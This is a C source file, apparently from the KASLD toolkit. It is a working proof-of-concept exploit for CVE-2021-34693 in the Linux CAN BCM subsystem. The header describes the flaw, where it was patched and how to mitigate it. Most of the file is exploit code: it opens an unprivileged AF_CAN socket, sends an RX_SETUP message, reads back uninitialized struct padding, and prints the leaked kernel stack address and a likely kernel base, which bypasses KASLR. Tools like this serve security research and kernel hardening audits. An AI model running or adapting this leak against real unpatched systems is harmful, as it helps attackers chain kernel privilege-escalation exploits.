// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel stack pointer from CAN BCM bcm_msg_head struct
// uninitialized 4-byte hole (CVE-2021-34693).
//
// Mostly taken from original PoC by Norbert Slusarek:
// https://www.openwall.com/lists/oss-security/2021/06/15/1/2
//
// Leak primitive:
//   Data leaked:      kernel stack pointer (uninitialized struct padding)
//   Kernel subsystem: net/can — CAN BCM (net/can/bcm.c)
//   Data structure:   struct bcm_msg_head (4-byte padding hole after flags)
//   Address type:     virtual (kernel stack)
//   Method:           exact
//   CVE:              CVE-2021-34693
//   Patched:          v5.12 (multiple commits)
//   Status:           fixed in v5.12
//   Access check:     none pre-v5.12 (AF_CAN socket creation, unprivileged)
//   Source:
//   https://elixir.bootlin.com/linux/v5.11/source/net/can/bcm.c
//
// Mitigations:
//   Patched in v5.12. Requires CONFIG_CAN=y and CONFIG_CAN_BCM=y/m.
//   AF_CAN socket creation may be restricted by LSM or network namespace
//   policy. No runtime sysctl can restrict access.
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-34693
// https://www.openwall.com/lists/oss-security/2021/06/15/1
// https://www.openwall.com/lists/oss-security/2021/06/15/1/2
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include <fcntl.h>
#include <linux/can.h>
#include <linux/can/bcm.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Exploits CVE-2021-34693: the CAN BCM bcm_msg_head struct has a "
    "4-byte padding hole between the count and ival1 fields that was "
    "not zeroed when copied to userspace. Reading back a BCM RX_SETUP "
    "message via recvmsg() leaked 4 bytes of kernel stack data, which "
    "often contains kernel text or stack virtual addresses. Fixed in "
    "v5.12.");

KASLD_META("method:heuristic\n"
           "phase:probing\n"
           "addr:virtual\n"
           "cve:CVE-2021-34693\n"
           "patch:v5.12\n"
           "config:CONFIG_CAN\n"
           "config:CONFIG_CAN_BCM\n");

void rxsetup_sock(int sock) {
  struct sockaddr_can sa;
  struct {
    struct bcm_msg_head b;
    struct canfd_frame f;
  } msg;

  memset(&msg, 0, sizeof(msg));

  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 0;

  msg.b.opcode = RX_SETUP;
  msg.b.flags = CAN_FD_FRAME | SETTIMER | STARTTIMER;
  msg.b.count = 0;
  msg.b.ival1.tv_sec = msg.b.ival2.tv_sec = 0;
  msg.b.ival1.tv_usec = msg.b.ival2.tv_usec = 1;
  msg.b.can_id = 0;
  msg.b.nframes = 1;

  sendto(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, sizeof(sa));
}

unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
  int sock;
  struct sockaddr_can sa;
  struct {
    struct bcm_msg_head b;
    struct canfd_frame f;
  } msg;
  char addrs[9];
  char buf[sizeof(msg)];
  char *endptr;
  unsigned long addr = 0;

  printf("[.] trying bcm_msg_head struct stack pointer leak ...\n");

  sock = socket(AF_CAN, SOCK_DGRAM, CAN_BCM);

  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  sa.can_addr.tp.rx_id = 0;
  sa.can_addr.tp.tx_id = 0;

  connect(sock, (struct sockaddr *)&sa, sizeof(sa));

  rxsetup_sock(sock);

  memset(&sa, 0, sizeof(sa));
  sa.can_family = AF_CAN;
  sa.can_ifindex = 0;
  socklen_t len = 0;

  memset(&msg, 0, sizeof(msg));

  recvfrom(sock, &msg, sizeof(msg), 0, (struct sockaddr *)&sa, &len);

  memcpy(buf, &msg, sizeof(buf));

  if (sizeof(buf) < 112)
    return 0;

  snprintf(addrs, sizeof(addrs), "%02x%02x%02x%02x", buf[39], buf[38], buf[37],
           buf[36]);

  addr = strtoul(addrs, &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_addr_from_bcm_msg_head_struct();
  if (!addr) {
    printf("[-] no kernel address leaked via BCM socket\n");
    return 0;
  }

  printf("leaked stack pointer: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "bcm_msg_head_struct",
               NULL);

  return 0;
}
